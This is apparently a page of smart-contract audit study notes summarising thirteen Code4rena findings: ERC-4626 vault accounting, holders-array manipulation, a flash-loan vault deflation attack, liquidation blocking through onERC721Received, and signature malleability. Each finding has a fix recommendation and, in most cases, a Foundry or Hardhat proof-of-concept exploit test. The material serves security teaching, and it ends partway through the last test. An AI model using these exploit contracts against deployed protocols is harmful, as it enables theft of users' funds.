# ETAAcademy-Adudit: 1. Openzeppelin

<table>
  <tr>
    <th>title</th>
    <th>tags</th>
  </tr>
  <tr>
    <td>01. Openzeppelin</td>
    <td>
      <table>
        <tr>
          <th>audit</th>
          <th>basic</th>
          <th>library</th>
          <td>openzeppelin</td>
        </tr>
      </table>
    </td>
  </tr>
</table>

[Github](https://github.com/ETAAcademy)｜[Twitter](https://twitter.com/ETAAcademy)｜[ETA-Audit](https://github.com/ETAAcademy/ETAAcademy-Audit)

Authors: [Eta](https://twitter.com/pwhattie), looking forward to your joining

## 1.[Medium] `maxYieldVaultWithdraw()` uses `yieldVault.convertToAssets()`

### ERC4626: `convertToAssets` and `convertToShares` replaced with `preview`

- Summary: convertToAssets and convertToShares functions could be replaced with yield vault's preview functions for accurate accounting based on current conditions. However, since preview functions may revert, they must be used carefully in prize vault functions like maxDeposit, maxWithdraw, ensuring they don't revert.

- Impact & Recommendation: Use yieldVault.previewRedeem(yieldVault.maxRedeem(address(this))).
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#m-01-the-winner-can-steal-claimer-fees-and-force-him-to-pay-for-the-gas) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    function _maxYieldVaultWithdraw() internal view returns (uint256) {
        return yieldVault.convertToAssets(yieldVault.maxRedeem(address(this)));
    }

  ```

  </details>

## 2.[Medium] Funds locked due to missing transfer check

### Two corner cases of ERC-20 and ERC-4246

- Summary: ERC-4626 does not guarantee transferring a specific amount of assets during redemption; only the specified shares are burned. When the contract tries to redeem shares for assets but receives feer shares than expected, leading to an insufficient asset balance. Despite the failed asset transfer, the ERC-20 compliant token only returns **`false`** instead of reverting the transaction. As a result, users’ assets become locked in the PrizeVault contract.

- Impact & Recommendation: To fix the problems, use OpenZeppelin's SafeERC20 safeTransfer for ERC-20 transfers and withdraw the necessary shares from the yield vault, either directly or after previewWithdraw/redeem.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-pooltogether#m-06-funds-locked-due-to-missing-transfer-check) & [Report](https://code4rena.com/reports/2024-03-pooltogether)

  <details><summary>POC</summary>

  ```solidity
    // Place in test/unit/PrizeVault/PoCLockedFunds.t.sol
    pragma solidity ^0.8.24;
    import { UnitBaseSetup } from "./UnitBaseSetup.t.sol";
    import { IERC20, IERC4626 } from "openzeppelin/token/ERC20/extensions/ERC4626.sol";
    import { ERC20PermitMock } from "../../contracts/mock/ERC20PermitMock.sol";
    import { ERC4626Mock } from "openzeppelin/mocks/ERC4626Mock.sol";
    import { Math } from "openzeppelin/utils/math/Math.sol";
    // An ERC20-compliant token that does not throw on insufficient balance.
    contract NoRevertToken is IERC20 {
        uint8   public decimals = 18;
        uint256 public totalSupply;
        mapping (address => uint)                      public balanceOf;
        mapping (address => mapping (address => uint)) public allowance;
        constructor(uint _totalSupply) {
            totalSupply = _totalSupply;
            balanceOf[msg.sender] = _totalSupply;
            emit Transfer(address(0), msg.sender, _totalSupply);
        }
        function transfer(address dst, uint wad) external returns (bool) {
            return transferFrom(msg.sender, dst, wad);
        }
        function transferFrom(address src, address dst, uint wad) virtual public returns (bool) {
            if (balanceOf[src] < wad) return false;                        // insufficient src bal
            if (src != msg.sender && allowance[src][msg.sender] != type(uint).max) {
                if (allowance[src][msg.sender] < wad) return false;        // insufficient allowance
                allowance[src][msg.sender] = allowance[src][msg.sender] - wad;
            }
            balanceOf[src] -= wad;
            balanceOf[dst] += wad;
            emit Transfer(src, dst, wad);
            return true;
        }
        function approve(address usr, uint wad) virtual external returns (bool) {
            allowance[msg.sender][usr] = wad;
            emit Approval(msg.sender, usr, wad);
            return true;
        }
    }
    // An ERC4626-compliant (yield) vault.
    // `withdraw(assets)` burns `assets * totalSupply / (totalAssets + 1)` shares.
    // `redeem(shares)` transfers `shares * (totalAssets + 1) / (totalSupply + 1)` assets.
    contract YieldVault is ERC4626Mock {
        using Math for uint256;
        constructor(address _asset) ERC4626Mock(_asset) {}
        function previewWithdraw(uint256 assets) public view virtual override returns (uint256) {
            return assets.mulDiv(totalSupply(), totalAssets() + 1);
        }
    }
    // Demonstrate that all of Alice's funds are locked in the PrizeVault,
    // with all corresponding shares burned.
    contract PoCLockedFunds is UnitBaseSetup {
        NoRevertToken asset;
        function setUpUnderlyingAsset() public view override returns (ERC20PermitMock) {
            return ERC20PermitMock(address(asset));
        }
        function setUpYieldVault() public override returns (IERC4626) {
            return new YieldVault(address(underlyingAsset));
        }
        function setUp() public override {
            return;
        }
        function test_poc_lockedFundsOnLossyWithdrawal() public {
            uint256 deposited = 1e18;
            // Mint 10^18 tokens and transfer them to Alice.
            asset = new NoRevertToken(deposited);
            super.setUp();
            asset.transfer(alice, deposited);
            // Alice holds all tokens, the yield vault and the price vaults are empty.
            assertEq(underlyingAsset.balanceOf(alice), deposited);
            assertEq(underlyingAsset.balanceOf(address(vault)), 0);
            assertEq(underlyingAsset.balanceOf(address(yieldVault)), 0);
            assertEq(yieldVault.totalSupply(), 0);
            assertEq(yieldVault.balanceOf(address(vault)), 0);
            assertEq(vault.totalSupply(), 0);
            assertEq(vault.balanceOf(alice), 0);
            // Alice enters the vault.
            vm.startPrank(alice);
            underlyingAsset.approve(address(vault), deposited);
            vault.deposit(deposited, alice);
            // All assets were transferred into the yield vault,
            // as many yield vault shares were minted to the prize vault, and
            // as many prize vault shares were minted to Alice.
            assertEq(underlyingAsset.balanceOf(alice), 0);
            assertEq(underlyingAsset.balanceOf(address(vault)), 0);
            assertEq(underlyingAsset.balanceOf(address(yieldVault)), deposited);
            assertEq(yieldVault.totalSupply(), deposited);
            assertEq(yieldVault.balanceOf(address(vault)), deposited);
            assertEq(vault.totalSupply(), deposited);
            assertEq(vault.balanceOf(alice), deposited);
            // Perform the lossy withdraw.
            vault.withdraw(deposited, alice, alice);
            // At this point Alice should've received all her assets back,
            // and all prize/yield vault shares should've been burned.
            // In contrast, no assets were transferred to Alice,
            // but (almost) all shares have been burned.
            assertEq(underlyingAsset.balanceOf(alice), 0);
            assertEq(underlyingAsset.balanceOf(address(vault)), 999999999999999999);
            assertEq(underlyingAsset.balanceOf(address(yieldVault)), 1);
            assertEq(yieldVault.totalSupply(), 1);
            assertEq(yieldVault.balanceOf(address(vault)), 1);
            assertEq(vault.totalSupply(), 0);
            assertEq(vault.balanceOf(alice), 0);
            // As a result, Alice's funds are locked in the vault;
            // she cannot even withdraw a single asset.
            vm.expectRevert();
            vault.withdraw(1, alice, alice);
            vm.expectRevert();
            vault.redeem(1, alice, alice);
        }
    }


  ```

  </details>

## 3.[High] Holders array can be manipulated by transferring or burning with amount 0, stealing rewards or bricking certain functions

### Transfer or burn 0 ERC-20 token

- Summary: Users can manipulate the holders array in the LiquidInfrastructureERC20 contract by transferring or burning tokens with an amount of 0. This allows them to add their address multiple times to the array, leading to unfair distribution of rewards.

- Impact & Recommendation: Adjust the logic in `_beforeTokenTransfer` to ignore burns, transfers where the amount is `0`, and transfers where the recipient already has a positive balance.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure#h-01-holders-array-can-be-manipulated-by-transferring-or-burning-with-amount-0-stealing-rewards-or-bricking-certain-functions) & [Report](https://code4rena.com/reports/2024-02-althea-liquid-infrastructure)

  <details><summary>POC</summary>

  ```solidity
    it("malicious user can add himself to holders array multiple times and steal rewards", async function () {
        const { infraERC20, erc20Owner, nftAccount1, holder1, holder2 } = await liquidErc20Fixture();
        const nft = await deployLiquidNFT(nftAccount1);
        const erc20 = await deployERC20A(erc20Owner);
        await nft.setThresholds([await erc20.getAddress()], [parseEther('100')]);
        await nft.transferFrom(nftAccount1.address, await infraERC20.getAddress(), await nft.AccountId());
        await infraERC20.addManagedNFT(await nft.getAddress());
        await infraERC20.setDistributableERC20s([await erc20.getAddress()]);
        const OTHER_ADDRESS = '0x1111111111111111111111111111111111111111'
        await infraERC20.approveHolder(holder1.address);
        await infraERC20.approveHolder(holder2.address);
        // Malicious user transfers 0 to himself to add himself to the holders array
        await infraERC20.transferFrom(OTHER_ADDRESS, holder1.address, 0);
        // Setup balances
        await infraERC20.mint(holder1.address, parseEther('1'));
        await infraERC20.mint(holder2.address, parseEther('1'));
        await erc20.mint(await nft.getAddress(), parseEther('2'));
        await infraERC20.withdrawFromAllManagedNFTs();
        // Distribute to all holders fails because holder1 is in the holders array twice
        // Calling distribute with 2 sends all funds to holder1
        await mine(500);
        await expect(infraERC20.distributeToAllHolders()).to.be.reverted;
        await expect(() => infraERC20.distribute(2))
            .to.changeTokenBalances(erc20, [holder1, holder2], [parseEther('2'), parseEther('0')]);
        expect(await erc20.balanceOf(await infraERC20.getAddress())).to.eq(parseEther('0'));
    });
    it("malicious user can add zero address to holders array", async function () {
        const { infraERC20, erc20Owner, nftAccount1, holder1 } = await liquidErc20Fixture();
        for (let i = 0; i < 10; i++) {
            await infraERC20.burn(0);
        }
        // I added a getHolders view function to better see this vulnerability
        expect((await infraERC20.getHolders()).length).to.eq(10);
    });

  ```

  </details>

## 4.[Medium] PrincipalToken is not ERC-5095 compliant

### ERC-5095 withdraw & redeem

- Summary: PrincipalToken doesn't meet ERC-5095 standards, causing potential integration issues. The contract's redeem, withdraw, maxWithdraw, and maxRedeem functions fail to meet the requirements specified by ERC-5095. These include supporting redemption and withdrawal flows where the sender has approval over the owner's tokens, not reverting in certain cases, and returning 0 when withdrawals or redemptions are disabled.

- Impact & Recommendation: PrincipalToken's redeem and withdraw functions need adjustment to allow msg.sender to have EIP-20 approval over the owner's tokens. Similarly, maxRedeem and maxWithdraw functions should return 0 when PrincipalToken is paused.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-spectra#m-01-principaltoken-is-not-erc-5095-compliant) & [Report](https://code4rena.com/reports/2024-02-spectra)

  <details><summary>POC</summary>

  ```solidity
      //copy-paste into `PrincipalToken.sol`
    function testRedeemDoesNotSupportERC20ApprovalFlow() public {
        uint256 amountToDeposit = 1e18;
        uint256 expected = _testDeposit(amountToDeposit, address(this));
        _increaseTimeToExpiry();
        principalToken.storeRatesAtExpiry();
        principalToken.approve(MOCK_ADDR_5, UINT256_MAX);
        assertEq(principalToken.allowance(address(this), MOCK_ADDR_5), UINT256_MAX);
        vm.startPrank(MOCK_ADDR_5);
        vm.expectRevert();
        //Should not revert as MOCK_ADDR_5 has allowance over tokens.
        principalToken.redeem(expected, MOCK_ADDR_5, address(this));
        vm.stopPrank();
    }

    function testWithdrawDoesNotSupportERC20ApprovalFlow() public {
        uint256 amount = 1e18;
        underlying.approve(address(principalToken), amount);
        principalToken.deposit(amount, testUser);
        principalToken.approve(MOCK_ADDR_5, UINT256_MAX);
        assertEq(principalToken.allowance(address(this), MOCK_ADDR_5), UINT256_MAX);
        vm.prank(MOCK_ADDR_5);
        vm.expectRevert();
        //Should not revert as MOCK_ADDR_5 has allowance over tokens.
        principalToken.withdraw(amount, MOCK_ADDR_5, testUser);
        vm.stopPrank();
    }

  ```

  </details>

## 5.[Medium] All yield generated in the IBT vault can be drained by performing a vault deflation attack using the flash loan functionality of the Principal Token contract

### ERC4626 deflation attack

- Summary: A vulnerability in the IBT vault enables a flash loan attack using the PrincipalToken contract's lending feature. By borrowing the entire IBT balance, an attacker can exploit the vault's share price formula, resetting it to the default value 1 and causing significant losses to users, who may lose all accumulated yield and more, depending on the IBT price.

- Impact & Recommendation: In the PrincipalToken::flashLoan function, verify that the IBT rate/price has not decreased once the flash loan has been repaid.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-spectra#m-02-all-yield-generated-in-the-ibt-vault-can-be-drained-by-performing-a-vault-deflation-attack-using-the-flash-loan-functionality-of-the-principal-token-contract) & [Report](https://code4rena.com/reports/2024-02-spectra)

  <details><summary>POC</summary>

  ```solidity
    // SPDX-License-Identifier: UNLICENSED
    pragma solidity 0.8.20;
    import {ContractPrincipalToken} from "./PrincipalToken4.t.sol";
    import "openzeppelin-contracts/interfaces/IERC4626.sol";
    import "openzeppelin-contracts/interfaces/IERC3156FlashBorrower.sol";
    contract PrincipalTokenIBTDelfation is ContractPrincipalToken {
        function testDeflateIBTVault() public {
            // TEST_USER_1 deposits 1 IBT into the principal token contract
            vm.startPrank(TEST_USER_1);
            underlying.mint(TEST_USER_1, 1e18 - 1); // -1 because TEST_USER_1 already has 1 wei of IBT
            underlying.approve(address(ibt), 1e18 - 1);
            ibt.deposit(1e18 - 1, TEST_USER_1);
            ibt.approve(address(principalToken), 1e18);
            principalToken.depositIBT(1e18, TEST_USER_1);
            vm.stopPrank();
            // TEST_USER_2 deposits 9 IBT into the principal token contract
            vm.startPrank(TEST_USER_2);
            underlying.mint(TEST_USER_2, 9e18);
            underlying.approve(address(ibt), 9e18);
            ibt.deposit(9e18, TEST_USER_2);
            ibt.approve(address(principalToken), 9e18);
            principalToken.depositIBT(9e18, TEST_USER_2);
            vm.stopPrank();
            // Simulate vault interest accrual by manualy inflating the share price
            vm.startPrank(TEST_USER_3);
            uint256 generatedYield = 10e18;
            underlying.mint(TEST_USER_3, generatedYield);
            underlying.transfer(address(ibt), generatedYield);
            vm.stopPrank();
            // Execute exploit using the Exploiter contract
            Exploiter exploiterContract = new Exploiter();
            uint256 underlyingBalanceBeforeExploit = underlying.balanceOf(address(exploiterContract));
            principalToken.flashLoan(exploiterContract, address(ibt), 10e18, "");
            uint256 underlyingBalanceAfterExploit = underlying.balanceOf(address(exploiterContract));
            assertEq(underlyingBalanceBeforeExploit, 0);
            assertEq(underlyingBalanceAfterExploit, generatedYield); // All of the generated yield got stollen by the attacker
        }
    }
    contract Exploiter is IERC3156FlashBorrower {
        function onFlashLoan(
            address initiator,
            address token,
            uint256 amount,
            uint256 fee,
            bytes calldata data
        ) external returns (bytes32) {
            IERC4626 ibt = IERC4626(token);
            ibt.redeem(amount, address(this), address(this));
            IERC20(ibt.asset()).approve(address(ibt), type(uint256).max);
            ibt.mint(amount + fee, address(this));
            ibt.approve(msg.sender, amount + fee);
            return keccak256("ERC3156FlashBorrower.onFlashLoan");
        }
    }

  ```

  </details>

## 6.[High] UniV3LiquidityAMO::recoverERC721 will cause ERC721 tokens to be permanently locked in rdpxV2Core

### Lacks ERC721-related functions

- Summary: UniV3LiquidityAMO's recoverERC721 function allows only the admin to transfer ERC721 tokens to the RdpxV2Core contract. However, the transfer of ERC721 tokens to RdpxV2Core is ineffective as RdpxV2Core and its inherited contracts lack the logic to handle ERC721 tokens. Additionally, transferring ERC721 tokens with tokenId == 0 is not feasible due to validation checks.

- Impact & Recommendation: RdpxV2Core lacks ERC721-related functions, as evident from its code. Solutions include implementing additional ERC721 recovery functions in RdpxV2Core or modifying UniV3LiquidityAMO::recoverERC721 to transfer all NFTs to msg.sender instead of RdpxV2Core.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-08-dopex#h-04-univ3liquidityamorecovererc721-will-cause-erc721-tokens-to-be-permanently-locked-in-rdpxv2core) & [Report](https://code4rena.com/reports/2023-08-dopex)

  <details><summary>POC</summary>

  ```solidity
  pragma solidity ^0.8.19;
    import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
    contract MockERC721 is ERC721
    {
        constructor() ERC721("...", "...")
        {
        }
        function giveNFT() public
        {
            _mint(msg.sender, 1);
        }
    }

    function testNFT() public
    {
        // needed `import "../../contracts/mocks/MockERC721.sol";` at the beginning of the file
        MockERC721 mockERC721 = new MockERC721();
        mockERC721.giveNFT();
        mockERC721.transferFrom(address(this), address(rdpxV2Core), 1);

        // approveContractToSpend won't be possible to use
        vm.expectRevert();
        rdpxV2Core.approveContractToSpend(address(mockERC721), address(this), 1);
    }

  ```

  </details>

## 7.[Medium] Malicious caller of processMessage() can pocket the fee while forcing excessivelySafeCall() to fail

### EIP150: 63/64

- Summary: The logic in the processMessage() function rewards the msg.sender even if the `_invokeMessageCall()` fails and the message enters a RETRIABLE state. This flaw can be exploited by a malicious user leveraging the 63/64th rule to provide just enough gas to execute the reward logic. The user can then receive rewards while saving on gas costs. This vulnerability allows for gaming the protocol and reduces incentives for external users to provide more gas than necessary.
- Impact & Recommendation: Only reward msg.sender with `_message.fee` if `_invokeMessageCall()` returns true. Hold the reward until a successful retryMessage(), then release it to the caller of `retryMessage()`.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-taiko#m-14-malicious-caller-of-processmessage-can-pocket-the-fee-while-forcing-excessivelysafecall-to-fail) & [Report](https://code4rena.com/reports/2024-03-taiko)

<details><summary>POC</summary>

```solidity
  File: contracts/bridge/Bridge.sol
  278:                          // Use the specified message gas limit if called by the owner, else
  279:                          // use remaining gas
  280: @--->                    uint256 gasLimit = msg.sender == _message.destOwner ? gasleft() : _message.gasLimit;
  281:
  282: @--->                    if (_invokeMessageCall(_message, msgHash, gasLimit)) {
  283:                              _updateMessageStatus(msgHash, Status.DONE);
  284:                          } else {
  285: @--->                        _updateMessageStatus(msgHash, Status.RETRIABLE);
  286:                          }
  287:                      }
  288:
  289:                      // Determine the refund recipient
  290:                      address refundTo =
  291:                          _message.refundTo == address(0) ? _message.destOwner : _message.refundTo;
  292:
  293:                      // Refund the processing fee
  294:                      if (msg.sender == refundTo) {
  295:                          refundTo.sendEther(_message.fee + refundAmount);
  296:                      } else {
  297:                          // If sender is another address, reward it and refund the rest
  298: @--->                    msg.sender.sendEther(_message.fee);
  299:                          refundTo.sendEther(refundAmount);
  300:                      }

```

</details>

## 8.[High] A locked fighter can be transferred; leads to game server unable to commit transactions, and unstoppable fighters

### `_beforeTokenTransfer()` hook and `safeTransferFrom(..., data)`

- Summary: The FighterFarm contract's transfer restrictions are bypassed by an inherited function from OpenZeppelin’s ERC721 contract, e.g., i.e., `safeTransferFrom(..., data)`, leading to two main issues: fighters become unstoppable by transferring them to new addresses after winning, preventing point subtraction; and fighters can act as "poison pills" by disrupting the `amountLost` mapping when transferred after losing, causing transaction failures and trapping players in losing zones. Both issues prevent the game server from committing transactions, compromising game integrity.

- Impact & Recommendation: Remove transfer checks from `transferFrom()` and `safeTransferFrom()` functions and enforce transfer restrictions using the `_beforeTokenTransfer()` hook.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-ai-arena#h-01-a-locked-fighter-can-be-transferred-leads-to-game-server-unable-to-commit-transactions-and-unstoppable-fighters) & [Report](https://code4rena.com/reports/2024-02-ai-arena)

<details><summary>POC</summary>

```solidity
diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol
index 6c5a1d7..dfaaad4 100644
--- a/test/RankedBattle.t.sol
+++ b/test/RankedBattle.t.sol
@@ -465,6 +465,31 @@ contract RankedBattleTest is Test {
         assertEq(unclaimedNRN, 5000 * 10 ** 18);
     }

+   /// @notice An exploit demonstrating that it's possible to transfer a staked fighter, and make it immortal!
+    function testExploitTransferStakedFighterAndPlay() public {
+        address player = vm.addr(3);
+        address otherPlayer = vm.addr(4);
+        _mintFromMergingPool(player);
+        uint8 tokenId = 0;
+        _fundUserWith4kNeuronByTreasury(player);
+        vm.prank(player);
+        _rankedBattleContract.stakeNRN(1 * 10 ** 18, tokenId);
+        // The fighter wins one battle
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);
+        // The player transfers the fighter to other player
+        vm.prank(address(player));
+        _fighterFarmContract.safeTransferFrom(player, otherPlayer, tokenId, "");
+        assertEq(_fighterFarmContract.ownerOf(tokenId), otherPlayer);
+        // The fighter can't lose
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        vm.expectRevert();
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 2, 1500, true);
+        // The fighter can only win: it's unstoppable!
+        vm.prank(address(_GAME_SERVER_ADDRESS));
+        _rankedBattleContract.updateBattleRecord(tokenId, 0, 0, 1500, true);
+    }


```

```solidity
diff --git a/test/RankedBattle.t.sol b/test/RankedBattle.t.sol
index 6c5a1d7..196e3a0 100644
--- a/test/RankedBattle.t.sol
+++ b/test/RankedBattle.t.sol
@@ -465,6 +465,62 @@ contract RankedBattleTest is Test {
         assertEq(unclaimedNRN, 5000 * 10 ** 18);
     }

+/// @notice Prepare two players and two fighters
+function preparePlayersAndFighters() public returns (address, address, uint8, uint8) {
+    address player1 = vm.addr(3);
+    _mintFromMergingPool(player1);
+    uint8 fighter1 = 0;
+    _fundUserWith4kNeuronByTreasury(player1);
+    address player2 = vm.addr(4);
+    _mintFromMergingPool(player2);
+    uint8 fighter2 = 1;
+    _fundUserWith4kNeuronByTreasury(player2);
+    return (player1, player2, fighter1, fighter2);
+}
+
+/// @notice An exploit demonstrating that it's possible to transfer a fighter with funds at stake
+/// @notice After transferring the fighter, it wins the battle,
+/// @notice and the second player can't exit from the stake-at-risk zone anymore.
+function testExploitTransferStakeAtRiskFighterAndSpoilOtherPlayer() public {
+    (address player1, address player2, uint8 fighter1, uint8 fighter2) =
+        preparePlayersAndFighters();
+    vm.prank(player1);
+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter1);
+    vm.prank(player2);
+    _rankedBattleContract.stakeNRN(1_000 * 10 **18, fighter2);
+    // Fighter1 loses a battle
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 2, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter1), 999 * 10 ** 18);
+    // Fighter2 loses a battle
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter2), 999 * 10 ** 18);
+
+    // On the game server, player1 initiates a battle with fighter1,
+    // then unstakes all remaining stake from fighter1, and transfers it
+    vm.prank(address(player1));
+    _rankedBattleContract.unstakeNRN(999 * 10 ** 18, fighter1);
+    vm.prank(address(player1));
+    _fighterFarmContract.safeTransferFrom(player1, player2, fighter1, "");
+    assertEq(_fighterFarmContract.ownerOf(fighter1), player2);
+    // Fighter1 wins a battle, and part of its stake-at-risk is derisked.
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter1, 0, 0, 1500, true);
+    assertEq(_rankedBattleContract.amountStaked(fighter1), 1 * 10 ** 15);
+    // Fighter2 wins a battle, but the records can't be updated, due to underflow!
+    vm.expectRevert();
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 0, 1500, true);
+    // Fighter2 can't ever exit from the losing zone in this round, but can lose battles
+    vm.prank(address(_GAME_SERVER_ADDRESS));
+    _rankedBattleContract.updateBattleRecord(fighter2, 0, 2, 1500, true);
+    (uint32 wins, uint32 ties, uint32 losses) = _rankedBattleContract.getBattleRecord(fighter2);
+    assertEq(wins, 0);
+    assertEq(ties, 0);
+    assertEq(losses, 2);
+}
```

</details>

## 9.[High] Owner of a position can prevent liquidation due to the onERC721Received callback

### `onERC721Received()` prevents liquidation

- Summary: When liquidating a position, the `_cleanUpLoan()` function is called to transfer the Uniswap LP position back to the user. However, this process relies on the `safeTransferFrom()` function, which invokes the `onERC721Received()` function on the owner's contract. If the owner's contract returns an invalid value, it can cause the `safeTransferFrom()` to revert, preventing liquidation.

- Impact & Recommendation: A solution to ensure liquidation occurs is to use a "pull over push" approach, where NFT approval is given to the owner, allowing them to redeem the NFT later.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-revert-lend#h-06-owner-of-a-position-can-prevent-liquidation-due-to-the-onerc721received-callback) & [Report](https://code4rena.com/reports/2024-03-revert-lend)

  <details><summary>POC</summary>

  ```solidity
    contract MaliciousBorrower {

        address public vault;
        constructor(address _vault) {
            vault = _vault;
        }
        function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
            // Does not accept ERC721 tokens from the vault. This causes liquidation to revert
            if (from == vault) return bytes4(0xdeadbeef);
            else return msg.sig;
        }
    }

  ```

  ```solidity
  function test_preventLiquidation() external {

        // Create malicious borrower, and setup a loan
        address maliciousBorrower = address(new MaliciousBorrower(address(vault)));
        custom_setupBasicLoan(true, maliciousBorrower);
        // assert: debt is equal to collateral value, so position is not liquidatable
        (uint256 debt,,uint256 collateralValue, uint256 liquidationCost, uint256 liquidationValue) = vault.loanInfo(TEST_NFT);
        assertEq(debt, collateralValue);
        // collateral DAI value change -100%
        vm.mockCall(
            CHAINLINK_DAI_USD,
            abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),
            abi.encode(uint80(0), int256(0), block.timestamp, block.timestamp, uint80(0))
        );

        // ignore difference
        oracle.setMaxPoolPriceDifference(10001);
        // assert that debt is greater than collateral value (position is liquidatable now)
        (debt, , collateralValue, liquidationCost, liquidationValue) = vault.loanInfo(TEST_NFT);
        assertGt(debt, collateralValue);
        (uint256 debtShares) = vault.loans(TEST_NFT);
        vm.startPrank(WHALE_ACCOUNT);
        USDC.approve(address(vault), liquidationCost);
        // This fails due to malicious owner. So under-collateralised position can't be liquidated. DoS!
        vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");
        vault.liquidate(IVault.LiquidateParams(TEST_NFT, debtShares, 0, 0, WHALE_ACCOUNT, ""));
    }
    function custom_setupBasicLoan(bool borrowMax, address borrower) internal {
        // lend 10 USDC
        _deposit(10000000, WHALE_ACCOUNT);
        // Send the test NFT to borrower account
        vm.prank(TEST_NFT_ACCOUNT);
        NPM.transferFrom(TEST_NFT_ACCOUNT, borrower, TEST_NFT);
        uint256 tokenId = TEST_NFT;
        // borrower adds collateral
        vm.startPrank(borrower);
        NPM.approve(address(vault), tokenId);
        vault.create(tokenId, borrower);
        (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);
        // borrower borrows assets, backed by their univ3 position
        if (borrowMax) {
            // borrow max
            vault.borrow(tokenId, collateralValue);
        }
        vm.stopPrank();
    }


  ```

  </details>

## 10.[Medium] State transition manager is unable to force upgrade a deployed ST, which invalidates the designed safeguard for ‘urgent high risk situation’

### executeUpgrade() & upgradeChainFromVersion()

- Summary: The StateTransitionManager (STM) cannot force upgrade a deployed State Transition (ST) in urgent high-risk situations due to incomplete implementation. Although access-controlled by both the chain admin and STM, there is no method in StateTransitionManager.sol that invokes upgradeChainFromVersion() and executeUpgrade(), which is only called during chain creation. This means executeUpgrade() cannot be invoked post-genesis for further upgrades.

- Impact & Recommendation: In StateTransitionManager.sol, add a method that can call executeUpgrade() or upgradeChainFromVersion() on a local chain.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-zksync#m-03-state-transition-manager-is-unable-to-force-upgrade-a-deployed-st-which-invalidates-the-designed-safeguard-for-urgent-high-risk-situation) & [Report](https://code4rena.com/reports/2024-03-zksync)

  <details><summary>POC</summary>

  ```solidity
    //code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol
        function upgradeChainFromVersion(
            uint256 _oldProtocolVersion,
            Diamond.DiamondCutData calldata _diamondCut
    |>    ) external onlyAdminOrStateTransitionManager {
    ...

    //code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Admin.sol
    function executeUpgrade(
        Diamond.DiamondCutData calldata _diamondCut
    |>    ) external onlyStateTransitionManager {
        Diamond.diamondCut(_diamondCut);
        emit ExecuteUpgrade(_diamondCut);
    }

            function _setChainIdUpgrade(
            uint256 _chainId,
            address _chainContract
        ) internal {
    ...
            //@audit executeUpgrade of an ST will only be called once at chain deployment, because _setChainIdUpgrade() is only invoked when creating a new chain.
    |>        IAdmin(_chainContract).executeUpgrade(cutData);
    ...

  ```

  </details>

## 11. Signatures from makers can be re-used due to malleability

### ECDSA

- Summary: The contract's use of ecrecover for maker signatures is vulnerable to signature malleability, allowing the same signature to be used twice. This happens because both (v,r,s) and (v,r,-s mod n) are valid signatures, but their hashes differ.

- Impact & Recommendation: To prevent signature reuse due to malleability, use the latest OpenZeppelin ECDSA library, which ensures the s value is in the lower range, or implement a nonce system for maker signatures.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-05-sofa-pro-league#h-03-signatures-from-makers-can-be-re-used-due-to-malleability) & [Report](https://code4rena.com/reports/2024-05-sofa-pro-league)

## 12.[High] Attacker can steal all fees from SFPM in pools with ERC777 tokens

### Update and Reentrancy

- Summary: An attacker can steal all outstanding fees from the Short Financial Position Market (SFPM) in a Uniswap pool if a token in the pool is an ERC777. The attacker deploys a contract implementing the `tokensToSend()` hook and transfers the ERC1155 before `feesBase` is set. By burning the position, the attacker steals all available fees.

- Impact & Recommendation: Update liquidity after minting/burning and use `ReentrancyLock()` modifier in `registerTokensTransfer()` to block reentrancy during minting and burning.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-panoptic#h-01-attacker-can-steal-all-fees-from-sfpm-in-pools-with-erc777-tokens) & [Report](https://code4rena.com/reports/2023-11-panoptic)

  <details><summary>POC</summary>

  ```solidity
        _moved = isLong == 0
        ? _mintLiquidity(_liquidityChunk, _univ3pool)
        : _burnLiquidity(_liquidityChunk, _univ3pool);
    s_accountLiquidity[positionKey] = uint256(0).toLeftSlot(removedLiquidity).toRightSlot(
        updatedLiquidity
    );
  ```

  </details>

## 13.[High] Partial transfers are still possible, leading to incorrect storage updates, and the calculated account premiums will be significantly different from what they should be

### Wide restriction of ERC1155

- Summary: Partial transfers of ERC1155 tokens in the protocol can lead to incorrect storage updates and significantly incorrect account premium calculations.

- Impact & Recommendation: Check the left slot (`removedLiquidity`) during transfers and restrict transfers if `removedLiquidity` is greater than zero.
  <br> 🐬: [Source](https://code4rena.com/reports/2023-11-panoptic#h-02-partial-transfers-are-still-possible-leading-to-incorrect-storage-updates-and-the-calculated-account-premiums-will-be-significantly-different-from-what-they-should-be) & [Report](https://code4rena.com/reports/2023-11-panoptic)

  <details><summary>POC</summary>

  ```solidity
  function test_transferpartial() public {
        _initPool(1);
